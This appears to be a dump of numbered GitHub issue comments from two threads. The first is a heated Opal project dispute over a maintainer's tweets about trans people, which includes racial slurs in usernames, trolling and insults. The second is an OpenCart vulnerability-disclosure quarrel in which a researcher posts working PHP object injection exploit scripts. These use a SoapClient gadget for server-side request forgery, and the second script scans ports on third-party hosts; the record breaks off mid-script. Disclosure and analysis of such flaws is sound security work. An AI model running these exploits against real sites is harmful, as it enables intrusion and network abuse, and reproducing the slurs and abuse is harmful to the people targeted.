Seems like we have an exciting conversation going.  I just got here, is there anyway I can get a tl;dr?
I hope everyone has a fantastic day!
"
4926	"@meh I agree with with @ipsumx here. Please stop responding, for the project's wellbeing. 

Shit (e.g. reddit/imgur/4chan/worst of the internet) is coming in.
"
4927	"@qq4u SJW's didn't like the 2nd top contributor tweet, wanted him to be removed from the project.
"
4928	"@Lolniggers lol mystery meat. Vegans are funny.
"
4929	"@juanplopes 

> @meh If the State ensures freedom by enforcing laws, is that taking freedom away, or making sure everyone gets a fair share of it?

It wouldn't be taking freedoms away, there has never been the freedom to bring personal views unrelated to the technology onto issues, IRC, mailing list, etc.

It would simply be a statement of the obvious. With the code of conduct @elia would still be able to do what he did, and not to do what he never did.
"
4930	"@lolnigger AND MAYBE THE EVEN DIDN'T MEAN IT LIKE THIS
"
4931	"Caveat: I am merely a member of the peanut gallery (and the queer community, and of the Ruby community at large) who has been watching this unfold for the past few hours.

I don't think that @elia was speaking out of malice, but out of ignorance, and my first instinct would be to contact him privately and explain why what he said was entirely out of line. He might not realize it.

I do think that there has been a lot of vitriol in this discussion, from both sides of the argument, and that's frustrating to see. This is definitely a topic worth discussing, though arguably this isn't the best venue for it. And the discussion hasn't gone anywhere in awhile. Plus, the trolls have arrived.
"
4932	"(oh look the fools who throw around ""SJW"" like it doesn't make them look stupid are here... yeesh)
"
4933	"@CBElizabeth - that's a great perspective. 
"
4934	"> And you have no information to know if I'm a good person or not, and never will, because I don't mix things that are irrelevant to eachother.

For a long time I held that this was the only way to be; that the separation of concerns was the only way to optimize for correctness. However, it turns out that programmers are arrogant and correctness is actually rather easy. What's hard is rallying a group of people who are pleasant to be around with a wide variety of experiences and perspective to contribute. So solving for that by working only with people that _actively affirm their decency_ is worth the effort, as it yields teams who intentionally cross the streams, like Loomio's, to good effect.
"
4935	"@abritinthebay Oh yeah, and is TOTTALY reasonable to ask for the 2nd top contributor to be removed because he had a different opinion on an unrelated social issue. You guys are surely not looking like idiots.
"
4936	"@BeauBouchard

> @meh, Please stop responding, This issue is being linked all over the internet, several forums are targeting this project and raiding it right now.
> 
> I highly recommend going into damage control mode and just not replying to these posts. There isn't constructive discussion going on anymore, its people with hurt feelings going out for their way for revenge guised as justice.

I know, but it would be rude to not reply to them, and it would go against what I stated previously if I were to lock the issue.

Thanks tho :panda_face: 
"
4937	"@CBElizabeth You nailed it.
"
4938	"@mrseth - If you read my comment further up, I agreed that was not the right thing to do. @CBElizabeth seems to have the same view btw.

But the trolls in here throwing around ""SJW"" like it doesn't make them look like the same hateful idiots that give tech a bad name aren't even discussing the issue - preferring to post under troll accounts. 
"
4939	"@abritinthebay

> @meh - would you at least agree that the statements made on that Twitter post are not representative of how the Opal project wishes to present itself to the world?
> 
> If that's true - acknowledging that would go at least some way to moving forward (aside from the trolls in here).

That's already been stated in this issue and in the official Opal twitter account, Opal has no opinions since it's a project.
"
4940	"@CoralineAda https://twitter.com/CoralineAda/status/611576768709787649 are you implying that anti-racism messages should only apply to white people?

I hope you understand that that, in itself, is racist
"
4941	"@meh Opal is an organisation, and thus “The culture of any organization is shaped by the worst behavior the leader is willing to tolerate."" (quote from Gruenter and Whitaker)
"
4942	"@meh when you have someone named @LolNiggers defending you it's probably time to stop and reevaluate. 
"
4943	"@ChrisPickard or just stop discussion, as troll takes over.
"
4944	"> Opal has no opinions since it's a project.

@meh - I don't know you, but you seem level headed (and are dealing with this shitstorm quite level headedly btw, even if we disagree). But... this shows an astounding level of ignorance of how the OSS community - and people even - works.

That's _never_ been true of _any_ project - the very act of making a projected OS is an opinion of the maintainers and community by a project. Of course the project and maintainers can be more or less opinionated and promote specific views. In this case you and the Opal twitter account saying it's _not_ representative is just that.

I think it's good that you and the Opal twitter account have said that. Honestly... it _should_ end there. But unfortunately I think you dealt with the initial post poorly and dismissively and so it's exploded.

It's going to be dragged into the dirt by trolls like the lovely Lol acct there too.
"
4945	"Yeah, the trolls have been linked here. I don't think that is @meh's fault and they aren't really _supporting_ him so much as inserting their crap into the conversation like they love to do.
"
4946	"@ChrisPickard

> @meh when you have someone named @LolNiggers defending you it's probably time to stop and reevaluate. 

It's not my fault the trolls come, and since it's a fake account it might very well be someone who isn't actually defending me, you know, fake account, trolls, stir up the flame, usual internet discussion involution.
"
4947	"> @emilyrose Did you ever use contact ANY contributor of Opal? If not, you don't have the right to warn anyone of anything.

Yes, I have! Thanks for your _completely objective_ concern, though! :smile_cat: 
"
4948	"> Opal has no opinions since it's a project.

@meh, honestly… Repeatedly parroting your thought that this issue is ""irrelevant"" because Opal is a technology isn't helping. I think it's admirable that you continue to respond to people here. I think that your willingness to accept a Code of Conduct as proposed in #942 is admirable. But you should stop trying to separate your technologies from your people. That separation has never existed. Yes, software is evaluated by machines. But it's written by and contributed to by and read by _people_. Yes, machines don't care what your contributors say on Twitter. But your _other_ contributors and potential future contributors _do_ care. You're just brushing that aside in a misguided and, in all likelihood, extremely futile attempt to separate code from people.
"
4949	"@emilyrose so did you experience any oppression while contacting said contributor? 
"
4950	"If you came here to argue that @elia has opinions that exclude others and should therefor be excluded in actual fact, try thinking a little harder. We're doing ourselves a disservice these days by being a demographic that works to turn hypothetical bigotry real.
"
4951	"@shenanigans - I think the discussion has moved beyond that by now. Aside from the trolls with 0-day accounts anyhow...
"
4952	"^^^ I rest my case.
"
4953	"^ In case that's confusing to anybody out of the loop, that comment (and others) were in reference to a troll account that's been removed. Thankfully.
"
4954	"@abritinthebay that's a sweeping generalisation, one person in a conversation involving this many is a minority, you shouldn't judge the actions of the many by the actions of the few.
"
4955	"What's a sweeping generalization? That the conversation had moved beyond hateful browbeating of each ""side"" and moved on to actual discussion? Aside from trolls that is?

Are you suggesting you'd like to go back to the crap-slinging further up in this thread? 
"
4956	"I thought you were suggesting the contrary 
"
4957	"My bad :+1:
"
4958	"Oh god no. I have nothing against the Opal team or project other than how this issue was initially handled by @meh - and I think if the CoC stuff goes through then I'll feel comfortable recommending the project again.

Honestly I think most productive discussion should move to #942 about the code of conduct. Hopefully the trolls will be stamped out (because they'll show up there too)
"
4959	"> “I wasn't aware issue trackers were for people.”

**This, alone,** is everything that's wrong with open source, today.
"
4960	"Have any of you read the tweets in question? The meaning seems pretty ambiguous. It looks like it might be case of misunderstanding, poor phrasing, or ignorance. I would have thought the rational thing (Other than leaving personal communications on an unrelated social platform completely out of this project, which would be my preference) to do would be to allow @elia the opportunity to respond to these allegations before starting a internet wide campaign to have him not only removed from the project, but also harassed on social media, and to potentially have his career impacted. 
"
4961	"> In all seriousness now, why can't we all separate politics and our different worldviews from the common goal that Opal's developers share?

Because code is for people.

> Do we really have to introduce thought policing on a source code management website?

We're not talking about _thought policing_. People can think whatever they want. But they shouldn't share beliefs in harmful ways and drive contributors away.

> Think about it a little.

We have.
"
4962	"Incidentally the topic of reassignment surgery on children is a lot more nuanced than, and it's discussion very far removed from: ""This guy doesn't believe trans people are human"" which is what I've seen people in this thread summarize his opinions as. 
"
4963	"@pay-denbts 

> why can't we all separate politics and our different worldviews from the common goal that Opal's developers share?

Programmers are people. Contributors are people. You cant' remove the _people_ equation from a project.

> Do we really have to introduce thought policing on a source code management website?

I agree the original poster was a bit.. er.. ham-handed and over-reacted. I think clarification from the Opal team was all the was needed. Calling for immediate ousting was over the top (and overly dramatic).

However calling for _consideration as a community_ on how a project's contributors can affect each other and the projects users... is not thought policing so much as _paying attention_. This is why I strongly support the Code Of Conduct initiative. 

> Think about it a little.

I have, a lot, as have many others. I'd strongly urge you to do the same.
"
4964	"@davidcelis I agree. The first line of the Code of Conduct should read:
1. In case you're an asshole – don't tell anybody. Or better yet, contribute anonymously.
"
4965	"@abritinthebay

> Oh god no. I have nothing against the Opal team or project other than how this issue was initially handled by @meh

If the title would have been different, @CoralineAda would have gotten a polite answer, I merely replied in tone.
"
4966	"@abritinthebay 

Well, to be fair, I don't think anyone bothered to stop to ask @elia to whom he was referring when he made the statement.

""@AstonJ @krainboltgreene that happens also after the reassignm. (not talking just about dr. Money) not accepting reality is the problem here"" is pretty vague, is he referring to transgender people? The people who refuse to accept the reality that transgender people exist, and won't allow their kids to be taught about it at school? Who knows?

Judging from the tweet that the subject of this issue is in response to, I'd say he probably doesn't hold any discriminatory opinions: https://twitter.com/elia/status/611300709217226754

I think that this whole thing has been blown way out of proportion from the beginning, as seems to generally be the case with these kinds of things, and https://github.com/opal/opal/issues/941#issuecomment-113273046 hits the nail on the head
"
4967	"@abritinthebay 

> Programmers are people. Contributors are people. You cant' remove the people equation from a project.

We sure can try ;)
"
4968	"> If the title would have been different, @CoralineAda would have gotten a polite answer, I merely replied in tone.

so to summarize, if @CoralineAda had said ""ouch"" in a more _polite tone_, you wouldn't have been so dismissive of this input?
"
4969	"@meh 

> If the title would have been different, @CoralineAda would have gotten a polite answer, I merely replied in tone.

Fair, but as a maintainer of the community I think you have to hold yourself to a higher standard than ""well she started it"". I get it though - I've been in that situation: it's frustrating and very easy to be overly short and glib with responses.
"
4970	"@ipsumx I'd go as far to say as that is actually impossible while code is written and used by people.
"
4971	"@AMHOL Thanks for pulling me in here, but no amount of context changes this from being a personal opinion that trans people are insane.

Coupled with his belief that the Italian Government going to force 4 year olds to touch each other's privates and perform reassignment surgery on young children without their parent's consent, I can't see how anyone could trust him to say anything reasonable.

Of course this entire conversation we're having is a follow up to him linking to a pro-""transracial"" article.
"
4972	"@krainboltgreene why don't you ask him?
"
4973	"@abritinthebay It's not possible or even desirable. We write code, ultimately, even if indirectly, to help people. Considering the effects on other people of anything our projects or their members do is a requirement to produce something useful. We are in a messy but hopefully beneficial part of discovering those effects right here. :)
"
4974	"@orangejulius oh I agree completely. Just commenting on the feasibility aspect ;) 
"
4975	"@AMHOL ...I did? I was in that conversation that everyone seems to be skimming.
"
4976	"Just want to express undying support for the people actually getting stuff done, as opposed to the people who only seem happy when they tear other human beings down.

To everyone trying to throw their weight around in this space: when you're done failing to inject your politics into hacker culture, why don't you go back to failing to inject them into gaming culture?
"
4977	"wow, this is so stupid. if i would own this project, i would close this issue even without saying anything
"
4978	"Hey @meh, at least you have Gamergate supporting your robotic view of the world.
"
4979	"@hnrysmth :+1:
"
4980	"@krainboltgreene you didn't ask him, you closed down the conversation the second he said anything you could (mis?)conceive as being offensive.
"
4981	"@krainboltgreene as much as the GG/TiA/KiA/RedPill loons are.. well.. toxic lunatics. Lets not lump @meh in with them. They are just using this as a soapbox for their stuff.

you know - like they always do. They love inserting themselves.
"
4982	"What's wrong with toxic lunatics having their pull requests accepted if their code is good?
"
4983	"@abritinthebay I wonder why.
"
4984	"@ipsumx this, just look at Terry Davis
"
4985	"> What's wrong with toxic lunatics having their pull requests accepted if their code is good?

Writing good code is easier than eliminating the side effects of being surrounded by toxic lunatics.

Edit:

To elaborate, it may often be worth the cost to _rewrite their contribution_ rather than to accept the costs of association.

Not trying to imply that this is the case here, actually, just addressing the direct question.
"
4986	"@emilyrose

> so to summarize, if @CoralineAda had said ""ouch"" in a more polite tone, you wouldn't have been so dismissive of this input?

No. It would have been dismissed, but politely.
"
4987	"@ipsumx in general? Nothing. As maintainers of a project though - it gets more complicated.
"
4988	"Why is this still being discussed?

The opinions of a developer, no matter how toxic they may be, are irrelevant to the project unless they bring them up and make them influence their work on the project, or the developer in question starts attacking people who work on or use this project, especially under their identity used to develop for this project. Their personal opinion doesn't matter in any way, shape, or form until that happens.
"
4989	"Oh look. More unproductive 0-day accounts with nothing to say except insult people. Yeesh. The M.O. is far too predictable.
"
4990	"Love the ad-hominems. Code has no ideology, I know that must infuriate you.
"
4991	"> Code has no ideology

If you believe this then I have a bridge to sell you...
"
4992	"> with nothing to say except insult people

Try for substance if you'd like to have an adult conversation. No one's buying what you're selling, if you haven't noticed.
"
4993	"@abritinthebay Tell me again how this doesn't fit in with the Gamergate narrative?
"
4994	"@to-json I'd argue that we are surrounded by toxic lunatics every day. They're just exceptionally stealthy about their business.
"
4995	"@krainboltgreene I don't think I ever said it didn't? 

I just meant lets not lump @meh in with those fools when he's already said the original comments weren't representative of the project and is open to a CoC. That's what I was objecting to.

People like the two trolls above are obviously in the mold you mention (if not GG, then similar hate-driven reactionary groups, they all have the same predictable m.o.)
"
4996	"@vgf89 I totally get the rationale behind your argument, and wish it worked like that. Ideally we could just accept good code and call it a day, but I don't think it's that simple. Many many people in this thread have already chimed in saying they aren't comfortable contributing to opal just because of the opinions of one of the maintainers. Some of them are already incredible developers. Some of them are just starting. Some of them don't even write code. But when you sum the potential for their contributions, it's way bigger than any one person.

And this doesn't stop with opal. Think of all the people who had the potential to contribute to OSS (or even become devs at a closed source shop and do useful work), but saw the developer community that reacts with hostility to their mere existence, and then went somewhere else. Usually we don't even hear their voices because they don't even get that far into our communities. A few of them like @CoralineAda have the energy and guts to speak up, but most don't. The biggest thing we can do to help is listen and consider what people not like us have to say.
"
4997	"@krainboltgreene I tried to look up what all this drama is about on Twitter, but 60% of what I see is you alleging someone else said various things and not providing sources for your claims. A few times you even had to correct yourself after they asked about it. The rest is either very ambiguous due to Twitter-brevity or in Italian, and sometimes there's obviously missing context that tweets were in reply to but was deleted.

To me it really looks like you're trying to smear someone as hard as possible because they don't happen to agree with you on an issue that is far more complicated than anything that is alleged here.
(Incidentally you have me blocked on Twitter without us ever interacting. Normally I would consider this unrelated, but since you've already brought up the topic I'll say this: You seem far too eager to dismiss anything another person does based on political ideology. It's really appalling to see this kind of mud-slinging, both in this case and that one.)
"
4998	"### Transphobic maintainer should be removed from project

> If you want him removed, start working on Opal and contributing as much as him to everything he did for Opal so we have a replacement that's more in orientation with your morals and views.

That's just the title and the first response btw. Let's meditate a bit on this one, and continue with our lives.

There are plenty of Gay, Transgender or whatever people in the OSS community that are pretty descent on what they do, and guess what everyone respects their opinion if it's right. How strange.

Also, in case someone missed a history class and don't know about the culture that we're building on http://www.catb.org/esr/faqs/hacker-howto.html#believe5

> To be a hacker, you have to develop some of these attitudes. But copping an attitude alone won't make you a hacker, any more than it will make you a champion athlete or a rock star. Becoming a hacker will take intelligence, practice, dedication, and hard work.
> 
> Therefore, you have to learn to **distrust attitude and respect competence** of every kind. Hackers won't let posers waste their time, but they worship competence — especially competence at hacking, but competence at anything is valued. Competence at demanding skills that few can master is especially good, and competence at demanding skills that involve mental acuteness, craft, and concentration is best.
> 
> If you revere competence, you'll enjoy developing it in yourself — the hard work and dedication will become a kind of intense play rather than drudgery. That attitude is vital to becoming a hacker.
"
4999	"**Wow that escalated quickly.** 

I also suggest closing the issue as it has nothing to do with Opal; we were having a private discussion that just happens to be on a public platform. As it happens I think Kurtis and I were doing a great job of helping (and I mean helping the cause) something the drama in this thread is not doing a good job of at all.

For the record, I took his comments in that tweet as two separate points and feel this has been blown out of proportion. 
"
5000	"Remove this nonsense already, arguing with these people is pissing into the wind.
"
5001	"> Think of all the people who had the potential to contribute to OSS (or even become devs at a closed source shop and do useful work), but saw the developer community that reacts with hostility to their mere existence, and then went somewhere else.

I wanna build on top of this. The common narrative is, roughly 'If you can't take the heat, stay out of the kitchen', and there's an elegance to that. However, it sits on top of a perception that FOSS does not need more people. Opal may not need more people; don't know, don't care enough to scroll up and check the open issue count. However, as a whole, FOSS definitely could use more motivated, interested bodies. This is especially true WRT adding things like accessibility options for webapps, or refining UIs. When you select for people compatible with working around assholes, you create large blind spots, and because of the nature of blind spots, _you can't even see that they are present_ until your shit starts falling over or becomes disused. Good projects die because of the perception that the human element is irrelevant.

Also, it's no wonder that ESR wants OSS to be a sociopath friendly zone if you've ever read his blog...
"
5002	"This discussion is even more interesting considering that @meh has repositories named fag and ruby-clit. Just sayin'.
"
5003	"> it sits on top of a perception that FOSS does not need more people

No, it sits on a perception that we don't need more people who care more about **political correctness** than **contribution**.

Why does everyone think this is some new idea they are delivering to the unwashed hackers? Open source is completely predicated on cooperation, acceptance, and diversity. You literally don't even have this system to make comments without it. No one is swallowing the poison pill being sold here except the people selling it. That's your right as an Anglo (as I'm sure most of you cultural colonialists are, as per usual)
"
5004	"This beyond insanity at this point. You people want to live in a world where everyone shares your opinion and if anyone expresses a differing opinion you want to hunt them down and stop them from contributing to FOSS projects, projects you're not even involved with; and you're so zealous in your bigotry you cannot see that you are the aggressor in this situation. You cannot see that a world where people cannot express opinions you find distasteful is not a utopian paradise but a prison that will trap us all. Someone's beliefs have nothing to do with code. These are fundamental differences between our worldviews. If you cannot accept that worldview work a different project that applies your principles there a lot of them starting up I hear.
"
5005	"You wound me, Anal Dash. I am felled by your wit.
"
5006	"> No, it sits on a perception that we don't need more people who care more about political correctness than contribution.

You haven't the foggiest what anyone's priorities are, nor what you lose by excluding them. Drop the myopia, it's a bad look.
"
5007	"@CoralineAda You're on the warpath now, aren't you?
"
5008	"@curti21 _emoji laugh_
"
5009	"Honestly, meh, I think you should just quickly have said ""Closed as it is not a contribution nor relevant to the project."" and locked the thread. These people are clearly more interested in discussing OT subjects than your project.
There are plenty of other places to discuss unrelated things if that's what you wish, all I know is that this is not the place.
"
5010	"I'd have zero problem using good code from a sociopath, such as a person who wishes to banish a contributor who feels that transsexuality is a disorder. Welcome, totalitarians!
"
5011	"> You haven't the foggiest

You're right, I don't.

So, you're saying that you value **contribution** over **political correctness**? If so, how is this topic in existence? You are either being intellectually dishonest, or you have some insight into something I haven't considered.

Please, explain to all of us how starting a witch hunt on a developer over their **personal remarks on Twitter** is indicative of valuing contribution over political correctness.
"
5012	"> So, you're saying that you value contribution over **political correctness? If so, how is this topic in existence? You are either being intellectually dishonest, or you have some insight into something I haven't considered.

I'm not the one being excluded (in this case). My valuse aren't really a factor. That said, I value good organizational principles over either of those things.

> Please, explain to all of us how starting a witch hunt on a developer over their personal remarks on Twitter is indicative of valuing contribution over political correctness? 

It's not. Witch hunt is exaggeratory, and starting this thread indicates exactly one thing: That @CoralineAda saw a problem she saw fit to bring up with the maintainers. It is neither indicative of her priorities, nor those of the people talking. 

Know what's important to me? My kids. Good weather. My bike. Fresh air. Code quality ranks somewhere around ""Having spare toilet paper"" and ""Mangoes for breakfast instead of cereal"". It's a nice to have.

However, having a good OSS community is more important to me that what I might have otherwise done with spare moments today.
"
5013	"Ouch. Good one.
"
5014	"Crying for the removal of any one person from any position due to disagreements of opinion that took place in an outside venue is exactly a witch hunt.
"
5015	"> Crying for the removal of any one person from any position due to disagreements of opinion that took place in an outside venue is exactly a witch hunt.

Actually, during witch hunts, real men burned real women on real stakes until they died. By comparison, this was a request that a person no longer have access to a particular collection of bits.

You're right, though, the SJWs are definitely the ridiculous ones here, asking for respect and stuff. How dare we.
"
5016	"Edit:

I think my previous comment above was being misinterpreted to my intent, so hopefully here is some clarity. I agree we do need a code of conduct, and #942 is a productive chat on this, and I will repeat what I said in that thread:  No contributors code is more important than the community at large. Project owners, maintainers and core contributors represent the ethics of a project. They are given those titles for good reason - to represent the project.
"
5017	"For anyone looking to expand on this topic in a constructive manner: #942. 
"
5018	"I have locked this issue not to stop the conversation, but to direct it to somewhere more appropriate.

Over the last few days, a number of people in this conversation have taken the issue in hand and shown that discrimination against other individuals in our industry is, quite frankly, alarming. The tech/development/computer industry has a long and troubled history of discrimination against various groups of individuals which, judging by some of the comments in this and other threads, shows no sign of improving anytime soon.

To the people who contributed comments and messages looking to improve our community: thank you.

This whole matter could have been sorted in a peaceful manner; instead the problems in our community are not just present inside Opal, they are still present within the whole developer community.

I encourage every individual who has taken part in this conversation to review our recently committed Code of Conduct. That is the standard this project will be run against, however I am open to making further improvements.

Please help continue this discussion at http://metaruby.com/c/ruby-forum/community-issues

Thank you,

Adam.
"
5019	"interesting how you open this github account only yesterday! im pretty sure you were banned before. when will you take the hint!!

after 3 times asking you to send me the vulnerability information you have now shown me that your are wasting my time again! 

the fact that all qty post parameters all have (int) next to them shows you have no clue nor should be giving security advice!
"
5020	"even if you managed to get an object into the serialized data there are no wake methods to call. 
"
5021	"1) I opened this GitHub account just to submit the ticket, never registered before.
2) I tried to be polite in reporting the issue, firstly using your contact form and then (seeing I haven't received any reply) using your community forum. I just asked for an email address where to send the vulnerability's details, but my request has been ignored, and then you replied ""I don't consider your security issue to be real!"" - I think it should be your concern to worry about the security of your product, but apparently it's a waste of time for you.
3) It's true that the $qty parameters are casted to (int), however if you carefully read my report, you'll see that I said ""key values"", and I don't see any cast to the $key parameter within the ""Cart::update()"" method: https://github.com/opencart/opencart/blob/master/upload/system/library/cart.php#L317.
4) What do you mean with ""there are no wake methods to call""? As I said I've been able to find one possible attack vector, that means that I have a working PoC for that, and I'm ready to post it here, since you are so mistrustful about the validity of this security issue.

An advice for you: next time somebody will try to report a security issue to you, try to be more polite, especially considering he/she is trying to help in improving your open source software for free.
"
5022	"@EgiX 

I'm interested in addressing this in OpenCart Community Edition.  Would changing the cart update() method to:

``` php
if ((int)$qty && ((int)$qty > 0) && isset($this->session->data['cart'][$key])) {
    $this->session->data['cart'][$key] = (int)$qty; 
    ...
}
```

fully resolve the issue?
"
5023	"Hi @opencarthelp,

Yes, I think so. Another possible solution would be to replace <i>serialize</i> with <i>json_encode</i> within the ""Cart::add()"" method, and <i>unserialize</i> with <i>json_decode</i> within the ""Cart::getProducts()"" method.
"
5024	"""I tried to be polite in reporting the issue, firstly using your contact form and then (seeing I haven't received any reply) using your community forum. I just asked for an email address where to send the vulnerability's details,""

it was not ignored dick head why lie! are you a professional or not? professionals don't need to lie to prove a point they use facts!

you have not sent any mails via *******@gmail.com since I have no support tickets or direct emails from this account!

3 times i asked you to send the details by private pm!

this is the 1st pm from me:

/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/*/
Re: Security Vulnerability
Sent: Tue Jun 03, 2014 12:37 pm
by Daniel

bgmenot wrote:
Hello,

yesterday I've tried to contact you using your contact form. I discovered a security issue in OpenCart, please contact me privately at my email address (*******@gmail.com) in order to get the vulnerability's details.

Kind regards,
EgiX

OpenCart:

just tell me!
/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/*/

2nd pm:

/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/*/
Re: Security Vulnerability
Sent: Wed Jun 04, 2014 5:02 am
by Daniel

Re: Security Vulnerability
Sent: Tue Jun 03, 2014 9:27 pm
by bgmenot

I could also tell you using this account, however is a _public_ account I found on bugmenot, so everyone can access this information. Though the severity of the vulnerability is not high, I thought you would like to read _privately_ its details using your email address. Do you have an email address I can use for such purpose? Or do you prefer a PM over here?

OpenCart:

send me the xxxxxxxx issue!

are you xxxxxxx stupid! wasting my xxxxxx time!
/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/*/

3rd time:

/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/*/
Re: Security Vulnerability
Sent: Wed Jun 04, 2014 10:26 am
by Daniel

EgiX wrote:
Hello again,

I can understand the reason why you wanted to delete the ""bgmenot"" account, however I don't understand why you haven't contacted me to get the vulnerability's details. It sounds like you're not interested about the security of your product, or you're underestimating what I have found. At this point I'm not sure whether I still want to RESPONSIBLY report the vulnerability to you. Furthermore, I find it really irresponsible that you suggest to ""report serious security bugs via a PM to an OpenCart moderator on the forum"" and now you're just ignoring my attempt to report the security issue.

OpenCart:

I don't consider your security issue to be real! this is the 3rd message now and you have not sent me anything! send me information on the vulnerability or stop messaging me!
/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/*/

you used a bugmenot account which was open to the public rather than contacting me using a private account!

this is not professional!

again your vulnerability is bullshit! while i understand how this would work there are no classes that would be preloaded that could cause any issues! you have done zero testing!

what are you 18, 19 20?

still at college?

http://karmainsecurity.com/about

stop bothering companies 

http://karmainsecurity.com/blog

you don't seem to have done any proper research when you find vulnerabilities and have been lazy by just come up with conclusions not doing any real testing! also lying on public issue trackers! 
"
5025	"I'm gonna ignore all you said just because I realized it's a waste of time try to deal with a stupid like you! However, I can't ignore your last accusation, since before saying that something is vulnerable, I always try to test it by writing a PoC. Since you're continuing to believe this ""vulnerability is bullshit"", I have no other options, and I have to post the PoC used to confirm it:

``` php
<?php

error_reporting(E_ERROR);
set_time_limit(0);
ini_set('default_socket_timeout', 5);

function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80))) die(""\n[-] No response from {$host}:80\n"");
    fputs($sock, $packet);
    return stream_get_contents($sock);
}

if ($argc < 3)
{
    print ""\nUsage......: php $argv[0] <host> <path>\n"";
    print ""\nExample....: php $argv[0] localhost /"";
    print ""\nExample....: php $argv[0] localhost /opencart/\n\n"";
    die();
}

list($host, $path) = array($argv[1], $argv[2]);

class DBMySQLi
{
    private $link;

    function __construct()
    {
        $this->link = new SoapClient(null, array('uri' => '', 'location' => 'http://test.com/'));
    }
}

$sid = md5(time());
$obj = urlencode(base64_encode(serialize(new DBMySQLi)));

$payload = ""quantity[:{$obj}]=1"";

$packet  = ""POST {$path}index.php?route=checkout/cart HTTP/1.0\r\n"";
$packet .= ""Host: {$host}\r\n"";
$packet .= ""Cookie: PHPSESSID={$sid}\r\n"";
$packet .= ""Content-Length: "".strlen($payload).""\r\n"";
$packet .= ""Content-Type: application/x-www-form-urlencoded\r\n"";
$packet .= ""Connection: close\r\n\r\n{$payload}"";

http_send($host, $packet);

$packet  = ""GET {$path}index.php HTTP/1.0\r\n"";
$packet .= ""Host: {$host}\r\n"";
$packet .= ""Cookie: PHPSESSID={$sid}\r\n"";
$packet .= ""Connection: close\r\n\r\n"";

print http_send($host, $packet);
```

Like I said to you, I believe the severity of the vulnerability is not so high, however this is just my personal point of view, and someone might disagree with it: some people (like you) might believe this is something not to worry about, while other people might think this is a security issue which a software vendor should care about. Maybe you simply don't understand the risk:

1) First of all, just because this is the only attack vector I found, it doesn't mean that someone smarter than me might be able to exploit the vulnerability in a more dangerous way.

2) Considering the OpenCart extensibility, I guess this vulnerability might be exploited even leveraging magic methods defined in 3rd party extensions. However, as I read in your README.md file, this shouldn't concern you since it doesn't affect the OpenCart core, isn't it?

3) As I said, from my personal standpoint the Server-Side Request Forgery attack vector is not something so critical. However, it might turn into something critical if abused by attackers in a targeted DDoS attack, leveraging all of the vulnerable OpenCart instances out there as zombie machines to carry out the attack. Furthermore, but I have not tested this, I think this vulnerability might exploited to map internal networks as well, like happened for the ""WordPress Pingback Vulnerability"".
"
5026	"so you are back to what if's! and 0 tests!

the above code would not work for another reason which is that the db class in opencart requires $hostname, $username, $password, $database fed into the constructor. even if you had this info the link would be overwritten on initiation. 

""Furthermore, but I have not tested this, I think this vulnerability might exploited to map internal networks as well, like happened for the ""WordPress Pingback Vulnerability""

Stop making wild guesses! 
"
5027	"<< <i>the above code would not work for another reason which is that the db class in opencart requires $hostname, $username, $password, $database fed into the constructor. even if you had this info the link would be overwritten on initiation.</i> >>

So you said you understand how this would work, but seeing what you say now it's clear you have completely no idea what a PHP object injection vulnerability is, and how it could be exploited: it doesn't make any sense what you're stating, because the constructor method is not called on unserialized objects, as opposed to their destructor methods. Indeed my PoC leverages the destructor method of the ""DBMySQLi"" class, which calls the <i>close</i> method on its ""link"" property:

``` php
    public function __destruct() {
        $this->link->close();
    }
```

By setting the ""link"" property to an arbitrary SoapClient object, its <i> __call</i> method will be triggered, and that's where the Server-Side Request Forgery attack happens (NOTE: if OpenCart is running on outdated PHP versions this could also be exploited to carry out XXE attacks, see CVE-2013-1643).

So it seems you are the one which came back with 0 tests, while I tested and confirmed the vulnerability using the PoC posted before. Furthermore, I just confirmed also my ""wild guess"", and like the ""WordPress Pingback Vulnerability"" this one could be exploited both for DDoS attacks, by abusing vulnerable OpenCart websites as zombie machines, and for scanning internal networks or remote hosts, using a slightly modified version of my PoC:

``` php
<?php

error_reporting(E_ERROR);
set_time_limit(0);
ini_set('default_socket_timeout', 5);

function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80))) die(""\n[-] No response from {$host}:80\n"");
    fputs($sock, $packet);
    return stream_get_contents($sock);
}

if ($argc < 4)
{
    print ""\nUsage......: php $argv[0] <host> <path> <host to scan>\n"";
    print ""\nExample....: php $argv[0] localhost / 192.168.1.1"";
    print ""\nExample....: php $argv[0] localhost /opencart/ google.com\n\n"";
    die();
}

list($host, $path, $host_to_scan) = array($argv[1], $argv[2], $argv[3]);

$ports = array(21, 22, 25, 53, 80, 106, 110, 143, 443, 631, 3306, 3389, 8443, 9999);

class DBMySQLi
{
    private $link;

    function __construct($host, $port)
    {
        $this->link = new SoapClient(null, array('uri' => '', 'location' => ""http://{$host}:{$port}/""));
    }
}

print ""[*] Scanning ports on {$host_to_scan}...\n"";

foreach ($ports as $port)
{
    $sid = md5(time());
    $obj = urlencode(base64_encode(serialize(new DBMySQLi($host_to_scan, $port))));

    $payload = ""quantity[:{$obj}]=1"";

    $packet  = ""POST {$path}index.php?route=checkout/cart HTTP/1.0\r\n"";
    $packet .= ""Host: {$host}\r\n"";
    $packet .= ""Cookie: PHPSESSID={$sid}\r\n"";
    $packet .= ""Content-Length: "".strlen($payload).""\r\n"";
    $packet .= ""Content-Type: application/x-www-form-urlencoded\r\n"";
    $packet .= ""Connection: close\r\n\r\n{$payload}"";

    http_send($host, $packet);

    $packet  = ""GET {$path}index.php HTTP/1.0\r\n"";
    $packet .= ""Host: {$host}\r\n"";
